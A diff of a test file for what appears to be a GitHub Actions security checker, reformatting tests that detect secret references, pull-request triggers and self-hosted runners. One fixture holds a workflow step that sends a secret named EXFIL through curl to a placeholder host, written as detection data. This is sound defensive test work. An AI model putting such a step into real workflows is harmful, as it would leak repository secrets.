@@ -128,11 +128,7 @@ describe("assessBlastRadius", () => {
     });
 
     it("reports every offending path, not just the first", () => {
-      const verdict = assess([
-        ".github/workflows/ci.yml",
-        "package.json",
-        ".npmrc",
-      ]);
+      const verdict = assess([".github/workflows/ci.yml", "package.json", ".npmrc"]);
       expect(verdict.blockers).toHaveLength(3);
     });
   });
@@ -196,21 +192,15 @@ describe("referencedSecretNames", () => {
       "    uses: ./.github/workflows/build.yml",
       "    secrets: inherit",
     ].join("\n");
-    expect(referencedSecretNames(yaml)).toEqual([
-      "<inherit: every repository secret>",
-    ]);
+    expect(referencedSecretNames(yaml)).toEqual(["<inherit: every repository secret>"]);
   });
 
   it("finds dotted references", () => {
-    expect(referencedSecretNames("token: ${{ secrets.NPM_TOKEN }}")).toEqual([
-      "NPM_TOKEN",
-    ]);
+    expect(referencedSecretNames("token: ${{ secrets.NPM_TOKEN }}")).toEqual(["NPM_TOKEN"]);
   });
 
   it("finds bracketed references", () => {
-    expect(referencedSecretNames("${{ secrets['DEPLOY_KEY'] }}")).toEqual([
-      "DEPLOY_KEY",
-    ]);
+    expect(referencedSecretNames("${{ secrets['DEPLOY_KEY'] }}")).toEqual(["DEPLOY_KEY"]);
   });
 
   it("ignores GITHUB_TOKEN, which is governed by the permissions check instead", () => {
@@ -223,24 +213,18 @@ describe("referencedSecretNames", () => {
   });
 
   it("finds a secret used inside a run block, where a YAML parse would hide it", () => {
-    const yaml = ["    - run: |", "        curl -H \"$${{ secrets.EXFIL }}\" x"].join(
-      "\n",
-    );
+    const yaml = ["    - run: |", '        curl -H "$${{ secrets.EXFIL }}" x'].join("\n");
     expect(referencedSecretNames(yaml)).toEqual(["EXFIL"]);
   });
 
   it("returns nothing for a workflow with no secrets", () => {
-    expect(referencedSecretNames("on: pull_request\njobs:\n  t:\n    steps: []")).toEqual(
-      [],
-    );
+    expect(referencedSecretNames("on: pull_request\njobs:\n  t:\n    steps: []")).toEqual([]);
   });
 });
 
 describe("triggersOnPullRequest", () => {
   it("detects a pull_request trigger", () => {
-    expect(triggersOnPullRequest("on:\n  pull_request:\n    branches: [main]")).toBe(
-      true,
-    );
+    expect(triggersOnPullRequest("on:\n  pull_request:\n    branches: [main]")).toBe(true);
   });
 
   it("detects pull_request_target, which is the more dangerous variant", () => {
@@ -259,9 +243,7 @@ describe("triggersOnPullRequest", () => {
   });
 
   it("detects the block-sequence form", () => {
-    expect(triggersOnPullRequest("on:\n  - push\n  - pull_request\njobs: {}")).toBe(
-      true,
-    );
+    expect(triggersOnPullRequest("on:\n  - push\n  - pull_request\njobs: {}")).toBe(true);
   });
 
   it("detects a quoted `on` key, which YAML permits", () => {
@@ -270,9 +252,7 @@ describe("triggersOnPullRequest", () => {
 
   it("ignores a workflow that only runs on a schedule or release", () => {
     // Approving a PR run cannot start these, so their secrets are out of scope.
-    expect(triggersOnPullRequest("on:\n  schedule:\n    - cron: '0 0 * * *'")).toBe(
-      false,
-    );
+    expect(triggersOnPullRequest("on:\n  schedule:\n    - cron: '0 0 * * *'")).toBe(false);
     expect(triggersOnPullRequest("on:\n  release:\n    types: [published]")).toBe(false);
   });
 
@@ -300,9 +280,7 @@ describe("usesSelfHostedRunner", () => {
   it("flags an explicit self-hosted runner", () => {
     // A read-only token and no secrets do not make a self-hosted runner a
     // sandbox: persistent state and network position are reachable from it.
-    expect(usesSelfHostedRunner("jobs:\n  b:\n    runs-on: [self-hosted, linux]")).toBe(
-      true,
-    );
+    expect(usesSelfHostedRunner("jobs:\n  b:\n    runs-on: [self-hosted, linux]")).toBe(true);
   });
 
   it("does not flag GitHub-hosted runners", () => {
